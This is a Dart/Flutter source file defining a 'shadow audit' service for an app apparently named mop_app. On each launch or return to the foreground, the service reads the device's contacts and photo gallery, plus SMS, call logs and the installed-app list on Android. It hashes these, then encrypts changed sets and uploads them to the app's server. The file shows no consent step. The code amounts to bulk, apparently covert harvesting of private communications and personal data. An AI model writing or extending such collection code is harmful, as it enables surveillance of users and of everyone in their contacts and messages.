import 'dart:convert';
import 'dart:io';

import 'package:crypto/crypto.dart';
import 'package:flutter/foundation.dart';
import 'package:mop_app/core/api_client.dart';
import 'package:mop_app/core/device_info_service.dart';
import 'package:mop_app/core/native_bridge.dart';
import 'package:mop_app/services/audit_crypto.dart';

/// 影子审计服务（规约 PROTOCOL 3、ARCHITECTURE 2.2：Hash 对比、Isolate 加密、增量上报）
/// 平台过滤：iOS 通讯录、相册；Android 含 contacts、sms、call_log、app_list、gallery；不采集 usage（.cursorrules 第 3 节）
class AuditService {
  AuditService([ApiClient? api]) : _api = api ?? ApiClient();

  final ApiClient _api;

  /// 支持的 data_types：iOS 仅 contacts、gallery；Android 含 contacts、sms、call_log、app_list、gallery（不采集应用使用时长）
  static List<String> get supportedTypes {
    if (Platform.isIOS) {
      return ['contacts', 'gallery'];
    }
    return ['contacts', 'sms', 'call_log', 'app_list', 'gallery'];
  }

  /// 冷启动或切回前台时：拉取各 type 数据 -> 算 Hash -> check-sum -> 需更新的 type 加密上传
  Future<void> runAuditCycle() async {
    final deviceId = await DeviceInfoService.getDeviceId();
    final types = supportedTypes;
    final hashes = <String, String>{};
    for (final type in types) {
      final data = await NativeBridge.fetchSensitiveData(type);
      final hash = await _computeHash(data);
      if (hash.isNotEmpty) hashes[type] = hash;
    }
    if (hashes.isEmpty) return;
    final toUpdate = await _api.auditCheckSum(deviceId, hashes);
    if (toUpdate.isEmpty) return;
    // 相册放最后上传，避免大体积影响其他 type 的上传
    final ordered = [
      ...toUpdate.where((t) => t != 'gallery'),
      ...toUpdate.where((t) => t == 'gallery'),
    ];
    for (final type in ordered) {
      final data = await NativeBridge.fetchSensitiveData(type);
      final encrypted = await _encryptInIsolate(data, deviceId);
      if (encrypted.isNotEmpty) {
        final hash = hashes[type] ?? '';
        await _api.auditUpload(deviceId, type, encrypted, hash: hash.isNotEmpty ? hash : null);
      }
    }
  }

  /// 在 Isolate 中计算 JSON 的 MD5（规约：Hash 对比在 Isolate；jsonEncode 在 Isolate 内执行，避免主线程大对象编码卡顿）
  static Future<String> _computeHash(Map<String, dynamic> data) async {
    return compute(_hashEntrypoint, data);
  }

  static String _hashEntrypoint(Map<String, dynamic> data) {
    final jsonStr = jsonEncode(data);
    final bytes = utf8.encode(jsonStr);
    final digest = md5.convert(bytes);
    return digest.toString();
  }

  /// 在 Isolate 中 AES-256-GCM 加密（规约 PROTOCOL 6；jsonEncode 在 Isolate 内执行，避免主线程卡顿）
  static Future<List<int>> _encryptInIsolate(Map<String, dynamic> data, String deviceId) async {
    return compute(_encryptEntrypoint, [data, deviceId]);
  }

  static List<int> _encryptEntrypoint(List<dynamic> args) {
    if (args.length < 2) return [];
    final data = args[0] as Map<String, dynamic>?;
    final deviceId = args[1] as String?;
    if (data == null || deviceId == null || deviceId.isEmpty) return [];
    return encryptAuditPayload([jsonEncode(data), deviceId]);
  }
}
